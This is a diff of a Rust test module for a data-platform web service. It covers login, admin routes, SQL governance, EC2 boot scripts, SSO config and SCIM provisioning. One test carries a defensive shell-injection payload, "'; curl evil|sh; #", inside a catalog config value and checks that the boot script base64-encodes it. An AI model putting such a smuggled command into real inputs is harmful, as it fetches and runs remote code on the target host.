-fn register_namespaced(
-    engine: &Engine,
-    catalog: &str,
-    schema: &str,
-    table: &str,
-    batch: weft_loom::arrow::record_batch::RecordBatch,
-) -> Result<(), String> {
-    use datafusion::catalog::{
-        CatalogProvider, MemoryCatalogProvider, MemorySchemaProvider, SchemaProvider,
-    };
-    use datafusion::datasource::MemTable;
-
-    let ctx = engine.ctx();
-    let mem = MemTable::try_new(batch.schema(), vec![vec![batch]]).map_err(|e| e.to_string())?;
-
-    let cat = match ctx.catalog(catalog) {
-        Some(c) => c,
-        None => {
-            let c: Arc<dyn CatalogProvider> = Arc::new(MemoryCatalogProvider::new());
-            ctx.register_catalog(catalog, c.clone());
-            c
-        }
-    };
-    let sch = match cat.schema(schema) {
-        Some(s) => s,
-        None => {
-            let s: Arc<dyn SchemaProvider> = Arc::new(MemorySchemaProvider::new());
-            cat.register_schema(schema, s.clone())
-                .map_err(|e| e.to_string())?;
-            s
-        }
-    };
-    sch.register_table(table.to_string(), Arc::new(mem))
-        .map_err(|e| e.to_string())?;
-    Ok(())
-}
 
 /// A column in the catalog browser.
 #[derive(Debug, Serialize)]
@@ -2764,54 +2781,75 @@ mod tests {
         body_json(resp).await["token"].as_str().map(String::from)
     }
 
-    #[tokio::test]
-    async fn login_success_and_failure() {
-        let st = state();
-        assert!(login_token(&st, "admin", "secretsecret1234")
-            .await
-            .is_some());
-        // Wrong password → no token (401).
-        assert!(login_token(&st, "admin", "wrong").await.is_none());
-        // Unknown user → 401.
-        assert!(login_token(&st, "nobody", "secretsecret1234")
-            .await
-            .is_none());
-    }
-
-    #[tokio::test]
-    async fn protected_routes_require_token() {
-        let st = state();
-        // No token → 401.
-        let resp = app(st.clone())
-            .oneshot(Request::get("/api/clusters").body(Body::empty()).unwrap())
-            .await
-            .unwrap();
-        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
-
-        // With token → 200, and /api/me reflects the principal.
-        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
-        let resp = app(st.clone())
+    /// Admin-only helper: create a (possibly non-admin) user and return the response status.
+    async fn create_user_via_admin(
+        st: &AppState,
+        admin_token: &str,
+        user: &str,
+        pass: &str,
+        groups: &[&str],
+    ) -> StatusCode {
+        let groups_json = serde_json::to_string(groups).unwrap();
+        app(st.clone())
             .oneshot(
-                Request::get("/api/me")
-                    .header("authorization", format!("Bearer {token}"))
-                    .body(Body::empty())
+                Request::post("/api/admin/users")
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {admin_token}"))
+                    .body(Body::from(format!(
+                        r#"{{"username":"{user}","password":"{pass}","groups":{groups_json}}}"#
+                    )))
                     .unwrap(),
             )
             .await
-            .unwrap();
-        assert_eq!(resp.status(), StatusCode::OK);
-        let me = body_json(resp).await;
-        assert_eq!(me["user"], "admin");
-        assert_eq!(me["authenticated"], true);
+            .unwrap()
+            .status()
     }
 
-    #[tokio::test]
-    async fn healthz_is_public() {
-        let resp = app(state())
-            .oneshot(Request::get("/healthz").body(Body::empty()).unwrap())
+    async fn post(st: &AppState, path: &str, token: &str, body: &str) -> StatusCode {
+        app(st.clone())
+            .oneshot(
+                Request::post(path)
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {token}"))
+                    .body(Body::from(body.to_string()))
+                    .unwrap(),
+            )
             .await
+            .unwrap()
+            .status()
+    }
+
+    /// Register a governed three-level table `main.sales.monthly_revenue` directly on the engine so
+    /// the governance test has a table in a named (non-default) catalog to authorize. Main's engine
+    /// seeds no local data (catalogs come from Glue), so the test sets up exactly what it needs.
+    fn seed_governed_table(st: &AppState) {
+        use datafusion::catalog::{CatalogProvider, MemoryCatalogProvider, MemorySchemaProvider, SchemaProvider};
+        use datafusion::datasource::MemTable;
+        use weft_loom::arrow::array::{Float64Array, StringArray};
+        use weft_loom::arrow::datatypes::{DataType, Field, Schema};
+        use weft_loom::arrow::record_batch::RecordBatch;
+
+        let batch = RecordBatch::try_new(
+            Arc::new(Schema::new(vec![
+                Field::new("month", DataType::Utf8, false),
+                Field::new("region", DataType::Utf8, false),
+                Field::new("revenue", DataType::Float64, false),
+            ])),
+            vec![
+                Arc::new(StringArray::from(vec!["2026-01", "2026-01", "2026-02"])),
+                Arc::new(StringArray::from(vec!["US", "EU", "US"])),
+                Arc::new(Float64Array::from(vec![120000.0, 88000.0, 135000.0])),
+            ],
+        )
+        .unwrap();
+        let table = Arc::new(MemTable::try_new(batch.schema(), vec![vec![batch]]).unwrap());
+        let schema = Arc::new(MemorySchemaProvider::new());
+        schema
+            .register_table("monthly_revenue".to_string(), table)
             .unwrap();
-        assert_eq!(resp.status(), StatusCode::OK);
+        let catalog = Arc::new(MemoryCatalogProvider::new());
+        catalog.register_schema("sales", schema).unwrap();
+        let _ = st.engine.ctx().register_catalog("main", catalog);
     }
 
     #[test]
@@ -2853,42 +2891,36 @@ mod tests {
         assert!(validate_connection("redis", "x", &HashMap::new()).is_err());
     }
 
-    /// Admin-only helper: create a (possibly non-admin) user and return the response status.
-    async fn create_user_via_admin(
-        st: &AppState,
-        admin_token: &str,
-        user: &str,
-        pass: &str,
-        groups: &[&str],
-    ) -> StatusCode {
-        let groups_json = serde_json::to_string(groups).unwrap();
-        app(st.clone())
-            .oneshot(
-                Request::post("/api/admin/users")
-                    .header("content-type", "application/json")
-                    .header("authorization", format!("Bearer {admin_token}"))
-                    .body(Body::from(format!(
-                        r#"{{"username":"{user}","password":"{pass}","groups":{groups_json}}}"#
-                    )))
-                    .unwrap(),
-            )
-            .await
-            .unwrap()
-            .status()
+    #[test]
+    fn ec2_user_data_keeps_catalog_conf_inert() {
+        // A connection value carrying a shell-breakout payload must NOT appear raw in the boot
+        // script; it is base64-encoded and decoded at runtime, so the shell never re-parses it.
+        let payload = "spark.sql.catalog.x.uri=thrift://h:9083'; curl evil|sh; #";
+        let ud = ec2_user_data("https://dl/weft", "us-west-2", payload);
+        assert!(
+            !ud.contains("'; curl evil|sh"),
+            "raw payload leaked into boot script:\n{ud}"
+        );
+        assert!(!ud.contains("evil|sh"), "no raw payload anywhere:\n{ud}");
+        assert!(ud.contains("base64 -d"), "conf must be decoded from base64");
+        assert!(
+            ud.contains(&base64_encode(payload.as_bytes())),
+            "conf must be carried as its base64"
+        );
+        // Operator-controlled values are present (not an injection vector).
+        assert!(ud.contains("AWS_REGION='us-west-2'"));
     }
 
-    async fn post(st: &AppState, path: &str, token: &str, body: &str) -> StatusCode {
-        app(st.clone())
-            .oneshot(
-                Request::post(path)
-                    .header("content-type", "application/json")
-                    .header("authorization", format!("Bearer {token}"))
-                    .body(Body::from(body.to_string()))
-                    .unwrap(),
-            )
-            .await
-            .unwrap()
-            .status()
+    #[test]
+    fn session_id_is_per_user_and_stable() {
+        assert_eq!(session_id_for("alice", "c1"), session_id_for("alice", "c1"));
+        assert_ne!(session_id_for("alice", "c1"), session_id_for("bob", "c1"));
+        assert_ne!(session_id_for("alice", "c1"), session_id_for("alice", "c2"));
+        // No longer the old hardcoded shared id.
+        assert_ne!(
+            session_id_for("alice", "c1"),
+            "00112233-4455-6677-8899-aabbccddeeff"
+        );
     }
 
     #[tokio::test]
@@ -2944,29 +2976,10 @@ mod tests {
         );
     }
 
-    #[test]
-    fn ec2_user_data_keeps_catalog_conf_inert() {
-        // A connection value carrying a shell-breakout payload must NOT appear raw in the boot
-        // script; it is base64-encoded and decoded at runtime, so the shell never re-parses it.
-        let payload = "spark.sql.catalog.x.uri=thrift://h:9083'; curl evil|sh; #";
-        let ud = ec2_user_data("https://dl/weft", "us-west-2", payload);
-        assert!(
-            !ud.contains("'; curl evil|sh"),
-            "raw payload leaked into boot script:\n{ud}"
-        );
-        assert!(!ud.contains("evil|sh"), "no raw payload anywhere:\n{ud}");
-        assert!(ud.contains("base64 -d"), "conf must be decoded from base64");
-        assert!(
-            ud.contains(&base64_encode(payload.as_bytes())),
-            "conf must be carried as its base64"
-        );
-        // Operator-controlled values are present (not an injection vector).
-        assert!(ud.contains("AWS_REGION='us-west-2'"));
-    }
-
     #[tokio::test]
     async fn non_admin_sql_is_governed() {
         let st = state();
+        seed_governed_table(&st);
         let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
         assert_eq!(
             create_user_via_admin(&st, &admin, "carol", "passwordpassword", &[]).await,
@@ -2992,7 +3005,7 @@ mod tests {
             }
         };
 
-        // Without a grant, carol cannot read the seeded governed table (fail-closed).
+        // Without a grant, carol cannot read the governed table (fail-closed).
         let j = run(carol.clone(), "SELECT * FROM main.sales.monthly_revenue").await;
         assert!(
             j["error"].as_str().unwrap_or("").contains("permission denied"),
@@ -3025,22 +3038,9 @@ mod tests {
         .await;
         assert!(j["error"].is_null(), "expected success after grant, got {j:?}");
 
-        // Admin is never blocked (owns the metastore) — even a file-scan TVF planning-errors rather
-        // than being governance-denied.
+        // Admin is never blocked (owns the metastore).
         let j = run(admin.clone(), "SELECT * FROM main.sales.monthly_revenue LIMIT 1").await;
         assert!(j["error"].is_null(), "admin query failed: {j:?}");
-    }
-
-    #[tokio::test]
-    async fn session_id_is_per_user_and_stable() {
-        assert_eq!(session_id_for("alice", "c1"), session_id_for("alice", "c1"));
-        assert_ne!(session_id_for("alice", "c1"), session_id_for("bob", "c1"));
-        assert_ne!(session_id_for("alice", "c1"), session_id_for("alice", "c2"));
-        // No longer the old hardcoded shared id.
-        assert_ne!(
-            session_id_for("alice", "c1"),
-            "00112233-4455-6677-8899-aabbccddeeff"
-        );
     }
 
     #[tokio::test]
@@ -3125,6 +3125,56 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn login_success_and_failure() {
+        let st = state();
+        assert!(login_token(&st, "admin", "secretsecret1234")
+            .await
+            .is_some());
+        // Wrong password → no token (401).
+        assert!(login_token(&st, "admin", "wrong").await.is_none());
+        // Unknown user → 401.
+        assert!(login_token(&st, "nobody", "secretsecret1234")
+            .await
+            .is_none());
+    }
+
+    #[tokio::test]
+    async fn protected_routes_require_token() {
+        let st = state();
+        // No token → 401.
+        let resp = app(st.clone())
+            .oneshot(Request::get("/api/clusters").body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
+
+        // With token → 200, and /api/me reflects the principal.
+        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/api/me")
+                    .header("authorization", format!("Bearer {token}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::OK);
+        let me = body_json(resp).await;
+        assert_eq!(me["user"], "admin");
+        assert_eq!(me["authenticated"], true);
+    }
+
+    #[tokio::test]
+    async fn healthz_is_public() {
+        let resp = app(state())
+            .oneshot(Request::get("/healthz").body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::OK);
+    }
+
+    #[tokio::test]
     async fn run_sql_executes_on_engine() {
         let st = state();
         let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
@@ -3147,42 +3197,6 @@ mod tests {
         assert!(j["error"].is_null());
     }
 
-    #[tokio::test]
-    async fn seeded_catalog_is_queryable() {
-        let st = state();
-        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
-        let auth = format!("Bearer {token}");
-        // The seeded three-level table is queryable.
-        let resp = app(st.clone())
-            .oneshot(
-                Request::post("/api/sql")
-                    .header("content-type", "application/json")
-                    .header("authorization", &auth)
-                    .body(Body::from(
-                        r#"{"sql":"SELECT region, sum(revenue) r FROM main.sales.monthly_revenue GROUP BY region ORDER BY region"}"#,
-                    ))
-                    .unwrap(),
-            )
-            .await
-            .unwrap();
-        let j = body_json(resp).await;
-        assert!(j["error"].is_null(), "query errored: {j:?}");
-        assert_eq!(j["columns"][0], "region");
-        assert_eq!(j["row_count"], 2);
-        // The catalog endpoint surfaces it.
-        let resp = app(st)
-            .oneshot(
-                Request::get("/api/catalog")
-                    .header("authorization", &auth)
-                    .body(Body::empty())
-                    .unwrap(),
-            )
-            .await
-            .unwrap();
-        let cat = body_json(resp).await;
-        let s = serde_json::to_string(&cat).unwrap();
-        assert!(s.contains("\"main\"") && s.contains("\"sales\"") && s.contains("monthly_revenue"));
-    }
 
     #[tokio::test]
     async fn grant_create_and_list() {
@@ -3266,5 +3280,432 @@ mod tests {
             .await
             .unwrap();
         assert_eq!(body_json(resp).await["state"], "TERMINATED");
+    }
+
+    // ── SSO config + SCIM provisioning (end-to-end through the real router) ──
+
+    /// Serialize tests that mutate process-global env (`WEFT_SCIM_TOKEN`, OIDC vars) so they don't
+    /// race other env-touching tests in this binary.
+    static ENV_LOCK: Mutex<()> = Mutex::new(());
+
+    #[tokio::test]
+    async fn auth_config_reports_sso_disabled_by_default() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::remove_var("WEFT_OIDC_ISSUER");
+        let st = state();
+        let resp = app(st)
+            .oneshot(
+                Request::get("/api/auth/config")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::OK);
+        let j = body_json(resp).await;
+        assert_eq!(j["sso_enabled"], false);
+        assert_eq!(j["provider_label"], "SSO");
+    }
+
+    #[tokio::test]
+    async fn sso_login_503_when_disabled() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::remove_var("WEFT_OIDC_ISSUER");
+        let st = state();
+        let resp = app(st)
+            .oneshot(
+                Request::get("/api/auth/sso/login")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
+    }
+
+    /// Build state with a SCIM token set (constructed under the env lock).
+    fn scim_state(token: &str) -> AppState {
+        std::env::set_var("WEFT_SCIM_TOKEN", token);
+        let st = AppState::new(
+            "admin",
+            "secretsecret1234",
+            b"test-secret".to_vec(),
+            PathBuf::from("web/dist"),
+        );
+        std::env::remove_var("WEFT_SCIM_TOKEN");
+        st
+    }
+
+    #[tokio::test]
+    async fn scim_disabled_returns_503() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::remove_var("WEFT_SCIM_TOKEN");
+        let st = state();
+        let resp = app(st)
+            .oneshot(
+                Request::get("/scim/v2/Users")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
+    }
+
+    #[tokio::test]
+    async fn scim_requires_bearer_token() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let st = scim_state("scim-secret");
+        // No token → 401.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/scim/v2/Users")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
+        // Wrong token → 401.
+        let resp = app(st)
+            .oneshot(
+                Request::get("/scim/v2/Users")
+                    .header("authorization", "Bearer wrong")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
+    }
+
+    #[tokio::test]
+    async fn scim_user_provisioning_round_trip() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let st = scim_state("scim-secret");
+        let auth = "Bearer scim-secret";
+
+        // Create a user in two groups.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::post("/scim/v2/Users")
+                    .header("content-type", "application/scim+json")
+                    .header("authorization", auth)
+                    .body(Body::from(
+                        r#"{"schemas":["urn:ietf:params:scim:schemas:core:2.0:User"],"userName":"alice@corp.com","groups":[{"value":"admins"},{"value":"analysts"}]}"#,
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::CREATED);
+        let created = body_json(resp).await;
+        assert_eq!(created["userName"], "alice@corp.com");
+        assert_eq!(created["meta"]["resourceType"], "User");
+
+        // The SSO/SCIM user has an empty password → local login must reject it.
+        assert!(login_token(&st, "alice@corp.com", "").await.is_none());
+
+        // Filtered list returns exactly that user.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get(r#"/scim/v2/Users?filter=userName%20eq%20%22alice@corp.com%22"#)
+                    .header("authorization", auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let j = body_json(resp).await;
+        assert_eq!(j["totalResults"], 1);
+        assert_eq!(j["Resources"][0]["userName"], "alice@corp.com");
+
+        // The group store reflects the membership (admin endpoint, behind a session token).
+        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/api/admin/groups")
+                    .header("authorization", format!("Bearer {token}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let groups = body_json(resp).await;
+        let analysts = groups
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|g| g["name"] == "analysts")
+            .expect("analysts group exists");
+        assert!(analysts["members"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|m| m == "alice@corp.com"));
+
+        // DELETE de-provisions.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::delete("/scim/v2/Users/alice@corp.com")
+                    .header("authorization", auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::NO_CONTENT);
+        let resp = app(st)
+            .oneshot(
+                Request::get("/scim/v2/Users/alice@corp.com")
+                    .header("authorization", auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
+    }
+
+    #[tokio::test]
+    async fn scim_group_patch_add_member() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let st = scim_state("scim-secret");
+        let auth = "Bearer scim-secret";
+
+        // Create group with one member.
+        app(st.clone())
+            .oneshot(
+                Request::post("/scim/v2/Groups")
+                    .header("authorization", auth)
+                    .header("content-type", "application/scim+json")
+                    .body(Body::from(
+                        r#"{"displayName":"engineers","members":[{"value":"alice"}]}"#,
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+
+        // PATCH add a member.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::patch("/scim/v2/Groups/engineers")
+                    .header("authorization", auth)
+                    .header("content-type", "application/scim+json")
+                    .body(Body::from(
+                        r#"{"Operations":[{"op":"add","path":"members","value":[{"value":"bob"}]}]}"#,
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::OK);
+        let g = body_json(resp).await;
+        let members: Vec<&str> = g["members"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|m| m["value"].as_str().unwrap())
+            .collect();
+        assert!(members.contains(&"alice") && members.contains(&"bob"));
+    }
+
+    // ── Admin-gated SSO runtime config ──
+
+    /// A session token for a non-admin principal (group `analysts`, not `admins`).
+    fn non_admin_token(st: &AppState) -> String {
+        st.issue_token("alice", &["analysts".to_string()]).unwrap()
+    }
+
+    #[tokio::test]
+    async fn admin_routes_reject_non_admins() {
+        let st = state();
+        let token = non_admin_token(&st);
+        let auth = format!("Bearer {token}");
+
+        // GET /api/admin/sso → 403 for a non-admin.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/api/admin/sso")
+                    .header("authorization", &auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+
+        // A mutating grant from a non-admin → 403 (gating the existing routes too).
+        let resp = app(st.clone())
+            .oneshot(
+                Request::post("/api/grants")
+                    .header("authorization", &auth)
+                    .header("content-type", "application/json")
+                    .body(Body::from(
+                        r#"{"securable_type":"table","securable_name":"main.s.t","privilege":"SELECT","principal_kind":"group","principal_id":"x","effect":"allow"}"#,
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+    }
+
+    #[tokio::test]
+    async fn sso_config_default_disabled_and_put_bogus_issuer_400() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::remove_var("WEFT_OIDC_ISSUER");
+        std::env::remove_var("WEFT_PUBLIC_BASE");
+        let st = state();
+        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        let auth = format!("Bearer {token}");
+
+        // Fresh state → SSO disabled, public config agrees.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/api/admin/sso")
+                    .header("authorization", &auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::OK);
+        let j = body_json(resp).await;
+        assert_eq!(j["enabled"], false);
+        assert_eq!(j["has_secret"], false);
+        assert!(j["callback_url"].as_str().unwrap().ends_with("/api/auth/callback"));
+
+        let resp = app(st.clone())
+            .oneshot(Request::get("/api/auth/config").body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(body_json(resp).await["sso_enabled"], false);
+
+        // PUT with an undiscoverable issuer → 400 with the documented message.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::put("/api/admin/sso")
+                    .header("authorization", &auth)
+                    .header("content-type", "application/json")
+                    .body(Body::from(
+                        r#"{"issuer":"https://invalid.invalid","client_id":"cid","client_secret":"sec"}"#,
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
+        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
+        let msg = String::from_utf8_lossy(&bytes);
+        assert!(msg.contains("could not discover OIDC issuer"), "got: {msg}");
+
+        // Still disabled after the failed PUT.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/api/admin/sso")
+                    .header("authorization", &auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(body_json(resp).await["enabled"], false);
+    }
+
+    #[tokio::test]
+    async fn sso_delete_disables_runtime_config() {
+        // Seed a live config directly (bypass discovery) so DELETE has something to turn off.
+        let st = state();
+        *st.oidc().write().unwrap() = Some(crate::oidc::OidcConfig::from_parts(
+            "https://issuer.example".into(),
+            "cid".into(),
+            "sec".into(),
+            "https://app/api/auth/callback".into(),
+            None,
+            None,
+            Some("Okta".into()),
+        ));
+        // Public config reports it enabled.
+        let resp = app(st.clone())
+            .oneshot(Request::get("/api/auth/config").body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(body_json(resp).await["sso_enabled"], true);
+
+        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        let auth = format!("Bearer {token}");
+        let resp = app(st.clone())
+            .oneshot(
+                Request::delete("/api/admin/sso")
+                    .header("authorization", &auth)
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::NO_CONTENT);
+
+        // Now disabled both at the live RwLock and the public config endpoint.
+        assert!(st.oidc().read().unwrap().is_none());
+        let resp = app(st.clone())
+            .oneshot(Request::get("/api/auth/config").body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+        assert_eq!(body_json(resp).await["sso_enabled"], false);
+    }
+
+    #[tokio::test]
+    async fn get_sso_never_returns_secret() {
+        let st = state();
+        *st.oidc().write().unwrap() = Some(crate::oidc::OidcConfig::from_parts(
+            "https://issuer.example".into(),
+            "cid".into(),
+            "topsecret".into(),
+            "https://app/api/auth/callback".into(),
+            None,
+            None,
+            None,
+        ));
+        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        let resp = app(st.clone())
+            .oneshot(
+                Request::get("/api/admin/sso")
+                    .header("authorization", format!("Bearer {token}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
+        let body = String::from_utf8_lossy(&bytes);
+        assert!(!body.contains("topsecret"), "secret leaked: {body}");
+        let j: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
+        assert_eq!(j["has_secret"], true);
+        assert_eq!(j["client_id"], "cid");
+    }
+
+    #[tokio::test]
+    async fn put_sso_empty_secret_no_existing_config_400() {
+        // With no existing config and an omitted secret, the secret-reuse path has nothing to reuse,
+        // so it 400s *before* attempting discovery (a clear message for the admin).
+        let st = state();
+        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        let resp = app(st.clone())
+            .oneshot(
+                Request::put("/api/admin/sso")
+                    .header("authorization", format!("Bearer {token}"))
+                    .header("content-type", "application/json")
+                    .body(Body::from(
+                        r#"{"issuer":"https://issuer.example","client_id":"cid"}"#,
+                    ))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
+        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
+        assert!(String::from_utf8_lossy(&bytes).contains("client_secret is required"));
     }
 }
